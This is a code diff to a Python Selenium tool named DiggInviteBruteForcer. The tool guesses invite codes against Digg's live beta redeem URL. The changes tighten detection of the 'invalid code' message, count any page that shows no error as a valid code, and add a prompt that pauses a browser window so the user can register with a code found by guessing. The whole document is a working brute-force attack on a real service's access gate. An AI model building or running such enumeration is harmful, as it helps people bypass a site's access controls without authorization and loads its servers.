@@ -22,9 +22,10 @@ import os
 from datetime import datetime
 
 class DiggInviteBruteForcer:
-    def __init__(self, num_windows=1, headless=True):
+    def __init__(self, num_windows=1, headless=True, pause_on_valid=False):
         self.num_windows = num_windows
         self.headless = headless
+        self.pause_on_valid = pause_on_valid
         self.base_url = "https://beta.digg.com/d/invite/redeem?code="
         self.invalid_text = "Uh oh! This code is invalid."
         self.valid_codes = []
@@ -102,48 +103,56 @@ class DiggInviteBruteForcer:
                 yield code
             
     def test_code(self, driver, code):
-        """Test a single invite code"""
+        """Test a single invite code - simple validation focused on error detection"""
         try:
             url = self.base_url + code
             driver.get(url)
             
             # Wait for page to load and JavaScript to execute
             try:
-                # First, wait for the basic page structure to load
+                # Wait for the page to load
                 WebDriverWait(driver, 10).until(
                     EC.presence_of_element_located((By.TAG_NAME, "body"))
                 )
                 
-                # Wait a bit more for JavaScript to potentially show the error message
-                time.sleep(2)
+                # Wait for JavaScript to execute and potentially show error message
+                time.sleep(3)
                 
-                # Try to find the error message element specifically
-                try:
-                    # Look for text that contains the invalid message
-                    error_element = driver.find_element(By.XPATH, f"//*[contains(text(), '{self.invalid_text}')]")
-                    if error_element:
-                        return False, code, "Invalid code"
-                except:
-                    # If we can't find the error element, check page source as backup
+                # Check multiple times to catch the error message that might appear with delay
+                for attempt in range(3):
                     page_source = driver.page_source
+                    
+                    # Primary check: Look for the invalid message text
                     if self.invalid_text in page_source:
                         return False, code, "Invalid code"
                     
-                # If no invalid message found, check for valid indicators
-                page_source = driver.page_source
+                    # Secondary check: Look for the full error message
+                    full_error_text = "Try opening the invite link again. Or a different code."
+                    if full_error_text in page_source:
+                        return False, code, "Invalid code"
+                    
+                    # Tertiary check: Look for red border error styling
+                    if "border-borders-danger-secondary" in page_source or "ring-red-500" in page_source:
+                        return False, code, "Invalid code (error styling detected)"
+                    
+                    # Try to find error element by XPath
+                    try:
+                        error_element = driver.find_element(By.XPATH, f"//*[contains(text(), '{self.invalid_text}')]")
+                        if error_element and error_element.is_displayed():
+                            return False, code, "Invalid code"
+                    except:
+                        pass
+                    
+                    # If this is not the last attempt, wait a bit more
+                    if attempt < 2:
+                        time.sleep(2)
                 
-                # Look for signs that this might be a valid code
-                # Valid codes might redirect or show different content
-                if "sign up" in page_source.lower() or "welcome" in page_source.lower() or "register" in page_source.lower():
-                    return True, code, "Valid code found!"
-                elif self.invalid_text not in page_source:
-                    # If there's no invalid message and we're not sure, treat as potentially valid
-                    return True, code, "Potentially valid code (no error message)"
-                else:
-                    return False, code, "Invalid code"
+                # If no error message found after all checks, assume it's valid
+                # Better to have false positives than miss real valid codes
+                return True, code, "Valid code (no error message detected)"
                     
             except TimeoutException:
-                return False, code, "Timeout"
+                return False, code, "Timeout waiting for page load"
                 
         except WebDriverException as e:
             return False, code, f"WebDriver error: {str(e)[:50]}"
@@ -210,6 +219,21 @@ class DiggInviteBruteForcer:
                 
                 if is_valid:
                     self.save_valid_code(tested_code)
+                    
+                    # Pause this worker if pause_on_valid is enabled and not in headless mode
+                    if self.pause_on_valid and not self.headless:
+                        print(f"\n🎉 Worker {worker_id}: Valid code found! Browser window is now paused for registration.")
+                        print(f"   Code: {tested_code}")
+                        print(f"   URL: {self.base_url + tested_code}")
+                        print(f"   Complete your registration in this browser window.")
+                        print(f"   Press Enter in this terminal when done to resume testing...")
+                        
+                        try:
+                            input()  # Wait for user to press Enter
+                            print(f"   Worker {worker_id} resuming...")
+                        except KeyboardInterrupt:
+                            print(f"\n   Worker {worker_id} interrupted during pause.")
+                            break
                 
                 # Update global progress counter
                 with self.lock:
@@ -219,8 +243,8 @@ class DiggInviteBruteForcer:
                     if self.codes_tested_count % 50 == 0:
                         self.print_progress()
                 
-                # Small delay to prevent overwhelming the server
-                time.sleep(0.5)  # Increased delay since we need to wait for JS
+                # Longer delay to prevent overwhelming the server and allow thorough checking
+                time.sleep(1.0)  # Increased delay for more thorough validation
                 
         except KeyboardInterrupt:
             print(f"Worker {worker_id} interrupted by user")
@@ -323,6 +347,24 @@ def main():
             print("\nExiting...")
             return
     
+    # Get pause preference if not in headless mode
+    pause_on_valid = False
+    if not headless:
+        while True:
+            try:
+                pause_choice = input("Pause browser window when valid code is found? (y/n) [default: y]: ").lower().strip()
+                if pause_choice == '' or pause_choice == 'y' or pause_choice == 'yes':
+                    pause_on_valid = True
+                    break
+                elif pause_choice == 'n' or pause_choice == 'no':
+                    pause_on_valid = False
+                    break
+                else:
+                    print("Please enter 'y' for yes or 'n' for no.")
+            except KeyboardInterrupt:
+                print("\nExiting...")
+                return
+    
     # Get number of codes to test
     while True:
         try:
@@ -343,10 +385,11 @@ def main():
             return
     
     mode_text = "headless" if headless else "visible"
-    print(f"\n🔧 Setting up {num_windows} Chrome windows in {mode_text} mode...")
+    pause_text = " (with pause on valid codes)" if pause_on_valid else ""
+    print(f"\n🔧 Setting up {num_windows} Chrome windows in {mode_text} mode{pause_text}...")
     
     # Create and run brute forcer
-    brute_forcer = DiggInviteBruteForcer(num_windows, headless)
+    brute_forcer = DiggInviteBruteForcer(num_windows, headless, pause_on_valid)
     brute_forcer.codes_per_worker = codes_per_worker  # Pass the user's choice
     brute_forcer.run()
 
